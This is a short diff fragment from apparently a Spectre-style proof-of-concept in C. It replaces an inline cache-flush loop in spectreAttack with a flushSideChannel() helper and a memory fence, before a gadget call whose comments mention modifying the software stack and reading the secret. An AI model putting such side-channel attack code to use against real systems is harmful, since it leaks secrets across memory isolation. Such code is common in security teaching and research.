@@ -702,13 +702,11 @@ void spectreGadget()
 
 void spectreAttack(char *ptr)
 {
-    int i;
     uint8_t s;
-    for (i = 0; i < 256; i++) {
-        _mm_clflush(&array[i * 512]);
-    }
-    for (i = 0; i < 100; i++) { }
 
+    flushSideChannel();
+    _mm_mfence();
+    
     /* modifies the software stack */
     spectreGadget();
     /* reads the secret */
